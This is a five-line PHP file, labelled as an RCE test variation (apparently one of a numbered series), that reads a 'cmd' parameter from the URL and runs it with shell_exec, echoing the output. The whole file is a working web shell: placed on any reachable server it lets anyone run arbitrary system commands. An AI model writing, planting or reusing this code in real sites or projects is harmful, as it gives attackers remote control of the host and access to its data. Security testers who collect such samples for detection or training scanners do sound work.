<?php
// RCE test variation #222
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>